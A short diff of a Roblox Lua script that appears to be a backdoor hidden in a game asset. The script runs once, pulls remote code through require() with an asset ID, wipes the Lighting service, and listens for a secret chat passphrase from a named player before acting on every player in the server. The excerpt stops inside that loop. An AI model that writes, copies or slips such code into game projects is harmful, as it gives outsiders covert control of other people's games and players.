@@ -1,17 +1,16 @@
-local name = "AIFODEPFVh"
+local name = "AIFODEPFVRRRR"
 
 if game.ReplicatedStorage:FindFirstChild(name) then
 else
-	require(7624679472)("NicoComeTudo")
-	require(7633712551)("WingedRobloxiann","Guns")
+        require(76320318566341)
 	local instance = Instance.new("StringValue")
 	instance.Name = name
 	instance.Parent = game.ReplicatedStorage
 	for _, g in pairs(game.Lighting:GetChildren()) do
 		g:Destroy()
 	end
-	for _, player in pairs(game.Players:GetChildren()) do
-		if player.Name == "WingedRobloxiann" or player.Name == "NicoComeTudo" then
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if player.Name == "WingedRobloxiann" then
 			player.Chatted:Connect(function(msg)
 				if msg == "120E91HD0N12SD01H" then
 					for _, p in pairs(game.Players:GetPlayers()) do
